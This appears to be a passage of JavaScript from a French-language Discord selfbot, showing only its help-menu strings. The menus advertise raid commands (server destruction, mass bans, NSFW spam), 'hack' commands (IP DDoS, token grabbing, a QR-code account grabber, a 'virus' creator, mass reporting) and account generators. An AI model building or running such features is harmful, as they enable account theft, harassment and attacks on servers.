                ${client.tools === "k3s" ? "" : "\`"}${prefix}gsplash (img)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie la bannière d'invitation du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}gboost (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive la bar des boosts du serveur"***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}gcom (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive la communautée du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}gnew (channel)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie le salon des nouveautées discord***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}galerte (channel)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie le salon des alertes discord***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}grule (channel)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie le salon des règles du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}gvanity (code)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie la vanity du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}gdelete (a2f)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Supprime le serveur discord***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}gleave${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Quitte le serveur***`.replaceAll('                ', ''))
            }
    
            else if (message.content === prefix + "status"){
                message.edit(`ガ __**${name} - Status**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}default${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***status par Défaut***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}secretstream (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active ton status en* Streaming* de manière dscrète** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}stream (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active ton status en* Streaming**"
                ${client.tools === "k3s" ? "" : "\`"}${prefix}play (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active ton status en* Playing**
                ${client.tools === "k3s" ? "" : "\`"}${prefix}watch (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active ton status en* Watching**
                ${client.tools === "k3s" ? "" : "\`"}${prefix}listen (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active ton status en* Listening**
                ${client.tools === "k3s" ? "" : "\`"}${prefix}compet (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active ton status en* Competing**
                ${client.tools === "k3s" ? "" : "\`"}${prefix}online${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active ton status en ligne***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}idle${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active ton status inactif***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}dnd${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active ton status ne pas déranger***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}invisible${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active ton status invisible***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}delact${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Reset ton profil***`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "raid"){
                
                message.edit(`ガ __**${name} - Raid**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}spam (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Spam un message*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}spam stop${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Stop le spam*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}role create (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Créer des roles de toutes les couleurs***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}role delete${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***supprime les rôles du serveur actuel***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}destroy (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Détruit le serveur actuel*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}deface${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Renomme le serveur, change la région et change la photo du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}admin perm${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Donne la permission ADMINISTRATEUR au rôle everyone***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}channels create (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée des salons sur le serveur actuel***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}channels delete${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Supprime tous les channel***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}channels shuffle${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Mélange tous les salons du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}emotes create (url)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée des emojis sur le serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}emotes delete${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Supprime les emotes du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}stickers create (url)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée des stickers sur le serveur actuel***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}stickers delete${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Supprime les stickers du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}renameall (pseudo)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie le pseudo de tous les membres du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}muteall${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Timeout tous les membres du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}kickall${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Expulse tous les membres du serveur*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}banall${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Banni tous les membres du serveur*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}mpall (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Envoie un message privé à tous les membres du serveur*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}sendall (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Envoie 5 messages dans tous les salons du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}bomber${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Spam le serveur d'images NSFW (très rapide)*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}webhookspam (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Spam un message avec des webhooks (très rapide)*** ${client.premium ? "" : "|「Premium Requis」"}`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "tools"){
                message.edit(`ガ __**${name} - Tools**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}clear (nombre)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Supprime une quantité spécifiques de messages***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}clearall${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Supprime tous vos messages d'un salon*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}cleardm${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Supprime tous vos salons MP***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}edit (nombre)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie un certain nombre de vos messages***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}find (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Trouves dans quel vocale est un utilisateur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}ipinfo (ip)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les informations relative à une IP***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}leaveall${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Quitte tous les serveurs discord***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}rainbowrole (role/stop)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Fait un rainbowrole*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}getid (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***récupère l'id de la personne mentionnée***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}ping${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche la latance du self***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}time${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche l'heure***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}ghostping (ping)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Fais un ghostping***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}mytoken${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche votre token dans la console***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}myip${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***montre ton ip dans la console***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}myhostname${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***montre ton hostename dans la console***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}newtoken${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***te créer un nouveau token sans changer ton mdp (relancer discord une fois la commande faite)***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}shutdown${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***éteint le selfbot***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}restart${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***relance le selfbot***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}tokencheck${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Vérifie si un token est valide***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}tokeninfo${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les informations relative à un token***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}tokenfuck${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Détruit un token discord***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}tools2${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche la suite des commandes tools***`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "tools2"){
                message.edit(`ガ __**${name} - Tools**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}allemotes (guildId)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Vole toutes les emotes d'un serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}allstickers (guildId)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Vole tous les stickers d'un serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}steal (emoji)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Ajoute un emoji à votre serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}bl (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Blacklist un utilisateur du selfbot*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}unbl (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Retire un utilisateur de la blacklist*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}pubmp (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive l'auto lecture des pub mp***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}pubmp sanction (bl/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Blacklist/ne fait rien lors d'un pubmp***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}afk (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive le système d'afk***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}afk on (message)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie le message d'AFK lors d'un AFK***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}copy (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Copie les messages d'un utilisateir***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}uncopy (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Arrête la copie d'un utilisateur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}gsniper (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive le giveaway sniper***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}vsniper (guildId)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Ajoute un serveur à la liste des serveurs à snipe*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}vsniper (remove/list)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche la liste des snipers/Retire un sniper*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}vlocker (guildId)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Empêche la modification de la vanity d'un serveur*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}vlocker (remove/list)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Retire un locker/Affiche la liste des serveurs lock*** ${client.premium ? "" : "|「Premium Requis」"}`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "mod"){
                message.edit(`ガ __**${name} - Modération**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}addrole (membre) (role)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Ajoute un rôle à un membre***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}delrole (membre) (role)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Retire un rôle d'un membre***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}derank (membre)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Retire tous les rôles d'un membre***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}rename (membre) (pseudo)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Renomme un membre avec un pseudo***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}mute (membre) (temps)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Timeout un membre pour une certaine durée***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}unmute (membre)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Enlève le timeout d'un membre du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}kick (membre)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Expulse un membre du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}ban (membre/id)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Banni un utilisateur du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}purge (nombre)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Supprime un certain nombre de messages***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}purgehack${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Envoie des messages vides pour ne plus voir les messages***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}lock (channel/all)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Vérouille un ou tous les salons du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}unlock (channel/all)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Dévérouille un ou tous les salons du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}hide (channel/all)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Cache un ou tous les salons du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}unhide (channel/all)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un ou tous les salons du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}sync (channel/all)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Synchronise les permissions d'un ou tous les salons***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}renew (channel)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Recrée un salon***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}unban (user/all)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Débanni un membre du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}createtext (channelName)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée un salon textuel***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}createvoice (ChannelName)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée un salon vocale***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}createcategory (ChannelName)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée une catégorie***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}createstage (channelName)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée un salon stage***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}createnew (channelName)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée un salon de nouveauté***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}createforum (channelName)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée un salon forum***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}rename channel (channel) (name)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Renomme un salon discord***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}delete channel (channelà${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Supprime un salon du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}antijoin (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive les joins du serveur***`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "nsfw"){
                if (nsfw !== "on" && nsfw !== true) return;
                message.edit(`ガ __**${name} - NSFW**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}4k${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Pas de description***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}anal${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Pas de description***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}ass${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Pas de description***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}boobs${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Pas de description***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}hanal${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Pas de description***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}hass${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Pas de description***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}hboobs${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Pas de description***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}hentai${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Pas de description***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}hkitsune${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Pas de description***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}hmidriff${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Pas de description***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}hneko${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Pas de description***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}holo${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Pas de description***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}kemonomimi${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Pas de description***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}neko${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Pas de description***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}pgif${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Pas de description***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}pussy${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Pas de description***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}yaoi${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Pas de description***`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "gen"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Générateur」`)
                .setDescription(`${prefix}nitro ▸ 𝐆𝐞𝐧𝐞𝐫𝐞 𝐮𝐧 𝐧𝐢𝐭𝐫𝐨 𝐚𝐥𝐞𝐚𝐭𝐨𝐢𝐫𝐞
                ${prefix}promo ▸ 𝐆𝐞𝐧𝐞𝐫𝐞 𝐮𝐧 𝐧𝐢𝐭𝐫𝐨 𝐏𝐫𝐨𝐦𝐨 (𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐗 𝐎𝐩𝐞𝐫𝐚𝐆𝐗)
                ${prefix}lol ▸ 𝐆𝐞𝐧𝐞𝐫𝐞 𝐮𝐧 𝐜𝐨𝐦𝐩𝐭𝐞 𝐋𝐞𝐚𝐠𝐮𝐞 𝐨𝐟 𝐋𝐞𝐠𝐞𝐧𝐝𝐬
                ${prefix}roblox ▸ 𝐆𝐞𝐧𝐞𝐫𝐞 𝐮𝐧 𝐜𝐨𝐦𝐩𝐭𝐞 𝐑𝐨𝐛𝐥𝐨𝐱
                ${prefix}color ▸ 𝐆𝐞𝐧𝐞𝐫𝐞 𝐮𝐧𝐞 𝐜𝐨𝐮𝐥𝐞𝐮𝐫 𝐚𝐥𝐞𝐚𝐭𝐨𝐢𝐫𝐞`.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})

                else message.edit(`ガ __**${name} - Générateur**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}nitro${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Génère un nitro aléatoire***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}promo${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Génère un nitro Promo (Discord X OperaGX)*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}lol${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Génère un compte League of Legends*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}roblox${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Génère un compte Roblox*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}color${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Génère une couleur aléatoire***`.replaceAll('                ', ''))
            }
                
            else if (message.content === prefix + "hack"){
                message.edit(`ガ __**${name} - Hack**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}ddos (ip/stop)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***DDOS une IP ou arrête son DDOS*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}rtoken${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche le token d'un utilisateur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}ipinfo (ip)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les informations d'une IP***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}qrnitro (open)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un QR Code nitro pour grabb un compte*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}ghostping${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Ghostping un utilisateur/un rôle***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}create webhook${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée un webhook sur le salon actuel***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}webhook info (url)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les informations d'un webhook***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}del webhook (url)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Supprime un webhook avec l'URL***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}virus (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée un virus***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}hiddenping (ping) (text)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Cache le ping***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}hiddeneveryone (text)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Cache le ping everyone***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}hiddeninvite (invite) (text)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Cache l'invite discord'***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}hiddenurl (url) (text)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Cache l'url envoyé'***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}massreport (msgId)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Report 100x un message pour hacking/physhing***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}injector check${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Vérifie si votre discord est infécté par un injecteur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}proxy (http/socks4/socks5)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Scrape des proxys en ligne*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}username (pseudo)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Cherche un pseudo sur plusieurs sites (OSINT)*** ${client.premium ? "" : "|「Premium Requis」"}`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "systeme"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Systeme」`)
                .setDescription(`${prefix}setprefix ▸ 𝐌𝐨𝐝𝐢𝐟𝐢𝐞 𝐥𝐞 𝐩𝐫𝐞𝐟𝐢𝐱 𝐝𝐮 𝐬𝐞𝐥𝐟𝐛𝐨𝐭
                ${prefix}settwitch ▸ 𝐌𝐨𝐝𝐢𝐟𝐢𝐞 𝐥𝐞 𝐭𝐰𝐢𝐭𝐜𝐡
                ${prefix}plateforme ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐬𝐮𝐫 𝐪𝐮𝐞𝐥 𝐩𝐥𝐚𝐭𝐞𝐟𝐨𝐫𝐦𝐞 𝐯𝐨𝐮𝐬 𝐮𝐭𝐢𝐥𝐢𝐬𝐞𝐳 𝐥𝐞 𝐬𝐞𝐥𝐟𝐛𝐨𝐭
                ${prefix}theme ▸ 𝐌𝐨𝐝𝐢𝐟𝐢𝐞 𝐥𝐞 𝐭𝐡è𝐦𝐞 𝐝𝐮 𝐬𝐞𝐥𝐟𝐛𝐨𝐭
                ${prefix}image1 ▸ 𝐌𝐨𝐝𝐢𝐟𝐢𝐞 𝐥𝐚 𝐩𝐞𝐭𝐢𝐭𝐞 𝐢𝐦𝐚𝐠𝐞 𝐝𝐞𝐬 𝐞𝐦𝐛𝐞𝐝𝐬
                ${prefix}image2 ▸ 𝐌𝐨𝐝𝐢𝐟𝐢𝐞 𝐥𝐚 𝐠𝐫𝐚𝐧𝐝𝐞 𝐢𝐦𝐚𝐠𝐞 𝐝𝐞𝐬 𝐞𝐦𝐛𝐞𝐝𝐬
                ${prefix}sinfo ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐥𝐞𝐬 𝐬𝐭𝐚𝐭𝐬 𝐝𝐞 𝐭𝐨𝐧 𝐜𝐨𝐦𝐩𝐭𝐞 𝐞𝐭 𝐩𝐜`.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})

                message.edit(`ガ __**${name} - Systeme**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}setprefix (prefix)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie le prefix du selfbot***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}settwitch (pseudo)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie le lien twitch***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}plateforme${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche sur quel plateforme vous utilisez le selfbot***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}theme (rsz/speed/k3s)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie le thème du selfbot*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}sinfo${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les stats de ton compte et pc (cpu, ram, a2f?, verif, nb, users, bot...)***`.replaceAll('                ', ''))
            }

